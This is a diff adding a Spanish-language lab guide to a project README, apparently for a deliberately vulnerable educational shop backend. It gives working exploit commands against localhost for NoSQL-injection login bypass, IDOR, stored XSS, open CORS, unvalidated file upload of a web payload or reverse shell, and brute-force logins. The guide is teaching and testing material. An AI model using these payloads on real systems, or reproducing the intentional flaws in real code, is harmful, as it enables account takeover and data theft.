@@ -101,6 +101,93 @@ Este dashboard es la herramienta principal para la gestión, seguimiento y docum
 
 ---
 
+## 🧪 Guía de Explotación Controlada
+
+> **⚠️ Importante:** Ejecuta estas pruebas únicamente en entornos de laboratorio. Cada escenario confirma fallas intencionales pensadas para la defensa del proyecto y no debe activarse en producción.
+
+### 1. NoSQL Injection · `POST /api/users/login`
+1. Levanta el backend (`npm install && npm start` dentro de `backend/src`).
+2. Registra un usuario legítimo o reutiliza uno existente para que la colección tenga documentos.
+3. Envía un JSON con operadores NoSQL en vez de credenciales válidas:
+   ```bash
+   curl -X POST http://localhost:3000/api/users/login \
+     -H "Content-Type: application/json" \
+     -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+   ```
+4. El endpoint responde `200 OK` y devuelve un usuario aun cuando no se proporcionó su contraseña, probando la inyección.
+
+### 2. Sensitive Data Exposure · Contraseñas en texto plano
+1. Desde `/api/users/register` crea una cuenta de prueba con una contraseña reconocible.
+2. Obtén `MONGO_URI` del `.env` y conéctate con `mongosh` (o Compass):
+   ```bash
+   mongosh "mongodb+srv://usuario:clave@cluster.mongodb.net/proyecto"
+   ```
+3. Consulta la colección:
+   ```javascript
+   db.users.find({}, { username: 1, password: 1 }).pretty()
+   ```
+4. Observa que el campo `password` almacena el valor original sin hashing ni cifrado, exponiendo datos sensibles.
+
+### 3. Broken Access Control / IDOR · Recursos por `userId`
+1. Crea dos usuarios (Victim y Attacker) y registra productos en ambos carritos mediante `POST /api/cart`.
+2. Copia el `userId` de la víctima (se devuelve al registrarla).
+3. Como atacante, consulta o modifica recursos ajenos sin autenticación:
+   ```bash
+   curl http://localhost:3000/api/cart/<victimId>
+   curl -X PUT http://localhost:3000/api/orders/<orderId> -H "Content-Type: application/json" -d '{"status":"paid"}'
+   ```
+4. El backend responde con los datos de la víctima o actualiza órdenes que no pertenecen al atacante, demostrando el IDOR.
+
+### 4. Stored XSS · Campos `description` y `comment`
+1. Inserta un payload HTML persistente:
+   ```bash
+   curl -X POST http://localhost:3000/api/reviews \
+     -H "Content-Type: application/json" \
+     -d '{"productId":"<id>","userId":"<attacker>","rating":5,"comment":"<script>alert(\"xss\")</script>"}'
+   ```
+   *(También funciona con `description` en `/api/products`.)*
+2. Abre la vista del front (o consulta `/api/reviews/<productId>`) para que el navegador renderice la reseña.
+3. El `script` se ejecuta en cualquier sesión que consuma ese contenido, confirmando XSS almacenado.
+
+### 5. Security Misconfiguration · CORS abierto y sin cabeceras duras
+1. Crea un archivo `exploit.html` fuera del proyecto:
+   ```html
+   <script>
+     fetch('http://localhost:3000/api/orders')
+       .then(r => r.json())
+       .then(data => document.body.innerText = JSON.stringify(data, null, 2));
+   </script>
+   ```
+2. Sirve el archivo con `npx http-server . -p 8081` (o ábrelo con `file://`).
+3. Al cargarlo en el navegador, la petición cross-origin se completa porque `cors()` permite `*` y no hay Helmet/headers restrictivos.
+4. En la página se muestran los pedidos obtenidos desde un origen no confiable, probando la mala configuración.
+
+### 6. Insecure File Upload · `POST /api/products` sin validación
+1. Prepara un archivo malicioso (`payload.html`, `reverse_shell.php`, etc.).
+2. Súbelo como si fuese una imagen:
+   ```bash
+   curl -X POST http://localhost:3000/api/products \
+     -F "name=Evil Product" \
+     -F "price=1" \
+     -F "image=@payload.html"
+   ```
+3. El backend responde `201` y almacena el archivo sin revisar extensión, tamaño ni MIME.
+4. Accede a `http://localhost:3000/uploads/products/<nombre-devuelto>` para descargar/ejecutar el payload directamente desde el servidor.
+
+### 7. Authentication Failures (Extra) · Sin rate limiting
+1. Localiza credenciales de un usuario objetivo (solo para demo).
+2. Ejecuta un script de fuerza bruta contra `/api/users/login`:
+   ```bash
+   while true; do
+     curl -s -X POST http://localhost:3000/api/users/login \
+       -H "Content-Type: application/json" \
+       -d '{"username":"victim","password":"'$(openssl rand -hex 2)'"}' >/dev/null
+   done
+   ```
+3. Observa que no existe bloqueo temporal, contador ni CAPTCHA: se admiten intentos ilimitados, lo que facilita ataques de credenciales.
+
+---
+
 ## 📊 Rubros de Evaluación (100 pts)
 
 *Revisar regularmente para asegurar cumplimiento.*
